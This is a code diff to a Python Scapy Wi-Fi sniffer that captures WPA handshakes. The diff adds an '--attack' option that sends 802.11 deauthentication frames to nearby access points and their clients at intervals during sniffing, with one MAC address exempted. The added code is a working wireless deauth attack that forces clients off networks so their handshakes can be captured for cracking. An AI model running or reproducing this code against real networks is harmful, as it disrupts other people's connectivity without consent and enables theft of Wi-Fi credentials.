@@ -148,6 +148,14 @@ class Configuration:
         self.mac_filter = mac_filter
         return
 
+    def parse_attack(self, attack):
+        self.attack = attack
+        return
+
+    def parse_skip(self, skip):
+        self.skip = skip
+        return
+
     def parse_args(self):
         parser = argparse.ArgumentParser()
 
@@ -199,6 +207,20 @@ class Configuration:
             dest="access_mac",
             help="Command for a specific mac addr.")
 
+        parser.add_argument(
+            "--attack",
+            action="store_true",
+            default=False,
+            dest="attack",
+            help="Launch Deauth attack while sniffing.")
+
+        parser.add_argument(
+            "-s",
+            action="store",
+            default=None,
+            dest="skip",
+            help="Mac to not deauth (Usually your own...)")
+
         results = parser.parse_args()
 
         self.parse_interface(results.interface)
@@ -208,6 +230,8 @@ class Configuration:
         self.parse_kill(results.kill)
         self.parse_unassociated(results.unassociated)
         self.parse_mac_filter(results.access_mac)
+        self.parse_attack(results.attack)
+        self.parse_skip(results.skip)
 
         self.user_force_variables_static()
         return
@@ -260,13 +284,17 @@ def handler_beacon(packet):
     global Global_Mac_Filter_Channel
 
     source = packet.addr2
+    mac = packet.addr3
 
     if source in Global_Access_Points:
         Global_Access_Points[source].msig = (get_rssi(packet.notdecoded))
         Global_Access_Points[source].mbeacons += 1
 
+        if configuration.attack and Global_Access_Points[source].mbeacons % 50 == 0:
+            send(Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Deauth(), inter=(0.05), count=(1))
+
     else:
-        mac = packet.addr3
+
         destination = packet.addr1
 
         Global_Handshakes[mac] = []
@@ -326,6 +354,9 @@ def handler_beacon(packet):
         if mac == Global_Mac_Filter:
             Global_Mac_Filter_Channel = channel
 
+        if configuration.attack and mac != configuration.skip:
+            send(Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Deauth(), inter=(0.05), count=(1))
+
     return
 
 def handler_data(packet):
@@ -345,6 +376,9 @@ def handler_data(packet):
             Global_Clients[address2].mnoise += 1
             Global_Clients[address2].msig = (get_rssi(packet.notdecoded))
 
+            if configuration.attack and Global_Clients[address2].mnoise % 10 == 0 and address2 != configuration.skip and address1 != configuration.skip:
+                send(Dot11(addr1=address2, addr2=address1, addr3=address1)/Dot11Deauth(), inter=(0.0), count=(1))
+
         elif check_valid(address2):
             Global_Clients[address2] = Client(address2, address1, get_rssi(packet.notdecoded))
             Global_Clients[address2].mnoise += 1
@@ -357,6 +391,9 @@ def handler_data(packet):
 
             Global_Clients[address1].mnoise += 1
             Global_Clients[address1].msig = (get_rssi(packet.notdecoded))
+
+            if configuration.attack and Global_Clients[address1].mnoise % 10 == 0 and address1 != configuration.skip and address2 != configuration.skip:
+                send(Dot11(addr1=address1, addr2=address2, addr3=address2)/Dot11Deauth(), inter=(0.0), count=(1))
 
         elif check_valid(address1):
             Global_Clients[address1] = Client(address1, address2, get_rssi(packet.notdecoded))
@@ -374,7 +411,7 @@ def handler_eap(packet):
         Global_Handshakes[packet.addr3].append(packet)
         Global_Access_Points[packet.addr3].meapols += 1
 
-        folder_path = ("~/pcaps/")
+        folder_path = ("/root/pcaps/")
         filename = (str(Global_Access_Points[packet.addr3].mssid)+"_"+str(packet.addr3)[-5:].replace(":", "")+".pcap")
 
         if len(Global_Handshakes[packet.addr3]) >= 6:
@@ -423,6 +460,7 @@ def get_rssi(decoded):
 def channel_hopper(configuration):
     global Global_Channel_Hopper_Flag
     global Global_Mac_Filter_Channel
+
 
     interface = configuration.interface
     frequency = configuration.frequency
@@ -483,6 +521,7 @@ def channel_hopper(configuration):
         system("sudo iwconfig "+interface+" freq "+channel+"G")
 
         configuration.channel = __FREQS__[channel]
+
         sleep(3)
     return
 
@@ -531,6 +570,7 @@ def get_un_clients():
                 str(Global_Clients[cl].msig),
                 Global_Access_Points[Global_Clients[cl].mbssid].mssid
             ])
+
         except:
             clients.append([
                 Global_Clients[cl].mmac,
@@ -645,8 +685,8 @@ def check_valid(mac):
     return True
 
 def create_pcap_filepath():
-    if not os.path.isdir("~/pcaps"):
-        os.system("mkdir ~/pcaps")
+    if not os.path.isdir("/root/pcaps"):
+        os.system("mkdir /root/pcaps")
     return
 
 def start_sniffer(configuration):
@@ -698,7 +738,7 @@ def int_main(configuration):
     Sniffer_Thread.start()
 
     create_pcap_filepath()
-    set_size(30, 81)
+    set_size(50, 83)
 
     if configuration.printer == True:
         printer_thread(configuration)
@@ -710,5 +750,7 @@ if __name__ == "__main__":
 
     configuration = Configuration()
     configuration.parse_args()
+    conf.iface = configuration.interface
 
     int_main(configuration)
+    # 756 GOAL: 656
